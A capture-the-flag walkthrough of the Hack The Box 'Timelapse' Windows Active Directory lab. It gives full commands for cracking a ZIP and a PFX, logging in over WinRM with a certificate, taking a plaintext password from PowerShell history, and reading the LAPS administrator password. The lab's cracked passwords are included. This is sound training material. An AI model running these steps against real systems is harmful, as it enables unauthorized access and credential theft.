# HTB Timelapse

> **Platform:** Hack The Box
> **OS:** Windows Server 2019 (Active Directory)
> **Domain:** `timelapse.htb` — DC `DC01` (`dc01.timelapse.htb`)
> **Difficulty:** Easy

## Attack Path Overview

1. **Recon** – DC with WinRM over **HTTPS** (5986) but no HTTP WinRM (5985). LAPS documentation on the `HelpDesk` share hints at the final step.
2. **Guest SMB** – the `Shares` share contains `Dev/winrm_backup.zip`.
3. **Crack the ZIP** – password `supremelegacy` → extracts `legacyy_dev_auth.pfx`.
4. **Crack the PFX** – password `thuglegacy` → extract client certificate and private key for the `legacyy` account.
5. **Certificate-based WinRM** – authenticate to WinRM over HTTPS as `legacyy` → user flag.
6. **PowerShell history** – `legacyy`'s `ConsoleHost_history.txt` contains `svc_deploy`'s password `E3R$Q62^12p7PLlC%KWaxuaV`.
7. **LAPS** – `svc_deploy` is in `LAPS_Readers` → read the local Administrator LAPS password → root flag.

## 3. Crack the ZIP → PFX File

```bash
zip2john winrm_backup.zip > winrm_backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
```

```
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:01 DONE
```

Extract:

```bash
7z x winrm_backup.zip
# password: supremelegacy
```

Produces `legacyy_dev_auth.pfx`.

---

## 4. Crack the PFX → Certificate + Key

A PFX (PKCS#12) container holds a certificate and its private key, protected by a separate password from the ZIP:

```bash
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
```

```
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:01:46 DONE
```

Extract the certificate and private key:

```bash
openssl pkcs12 -legacy \
  -in legacyy_dev_auth.pfx \
  -clcerts -nokeys \
  -out cert.pem
# password: thuglegacy

openssl pkcs12 -legacy \
  -in legacyy_dev_auth.pfx \
  -nocerts -noenc \
  -out key.pem
# password: thuglegacy

chmod 600 key.pem
```

Verify the certificate identifies the `legacyy` account:

```bash
openssl x509 -in cert.pem -noout -subject
```

| File    | Password        |
| ------- | --------------- |
| ZIP     | `supremelegacy` |
| PFX     | `thuglegacy`    |

## 5. Foothold — WinRM Certificate Auth as `legacyy`

WinRM supports client-certificate authentication. Since port 5986 (HTTPS) is the only WinRM port open, use `-S` (SSL) and `-P 5986`:

```bash
evil-winrm -i 10.129.76.149 \
  -S -P 5986 \
  -u legacyy \
  -c cert.pem \
  -k key.pem
```

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
```

## 6. PowerShell History → `svc_deploy`

Check PSReadLine's saved command history:

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

`ConvertTo-SecureString` only protects the password at runtime — the original cleartext stays in the history file.

```
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```

## 7. Lateral Movement — `svc_deploy`

```bash
evil-winrm -i 10.129.76.149 \
  -S -P 5986 \
  -u svc_deploy \
  -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

> Use single quotes in Bash because the password contains `$`.

```powershell
whoami /groups
```

`svc_deploy` is a member of `LAPS_Readers` — authorized to read the local Administrator LAPS password from Active Directory.

## 8. LAPS → Administrator

LAPS (Local Administrator Password Solution) stores randomly generated local admin passwords in the AD attribute `ms-Mcs-AdmPwd`. Retrieve it with NetExec:

```bash
nxc ldap 10.129.76.149 \
  -d timelapse.htb \
  -u svc_deploy \
  -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
  -M laps
```

The output shows the `DC01` computer object and its current Administrator password.

> The LAPS password is randomly generated and rotates, so retrieve it from your active instance.

## 9. Administrator Access

```bash
evil-winrm -i 10.129.76.149 \
  -S -P 5986 \
  -u Administrator \
  -p '<LAPS_PASSWORD>'
```

```powershell
whoami
# timelapse\administrator
```

The root flag is under the **TRX** profile, not Administrator:

```powershell
type C:\Users\TRX\Desktop\root.txt
```

> If the expected path doesn't have the flag, enumerate `C:\Users\*\Desktop\` for all profiles.

## Credential Summary

| Account         | Secret                      | How obtained                        |
| --------------- | --------------------------- | ----------------------------------- |
| (ZIP)           | `supremelegacy`             | `zip2john` + crack                  |
| (PFX)           | `thuglegacy`                | `pfx2john` + crack                  |
| `legacyy`       | (client certificate)        | PFX extraction → WinRM cert auth    |
| `svc_deploy`    | `E3R$Q62^12p7PLlC%KWaxuaV` | PowerShell `ConsoleHost_history.txt` |
| `Administrator` | (LAPS password)             | `LAPS_Readers` group → `ms-Mcs-AdmPwd` |

## Lessons Learned

- **WinRM certificate auth** — when only port 5986 (HTTPS) is open and you have a PFX, extract the cert and key with `openssl pkcs12` and connect via `evil-winrm -S -P 5986 -c cert.pem -k key.pem`.
- **ZIP and PFX have independent passwords** — cracking the archive doesn't give you the PKCS#12 passphrase.
- **PowerShell history** (`ConsoleHost_history.txt`) is a rich credential source. `ConvertTo-SecureString` protects the password in memory but leaves the plaintext in the saved command history.
- **LAPS** — members of `LAPS_Readers` can retrieve the local Administrator password from the `ms-Mcs-AdmPwd` AD attribute. Check group memberships to see if you have this access.
- **Root flag location** — the flag isn't always in `C:\Users\Administrator\Desktop`. Enumerate all user profiles.
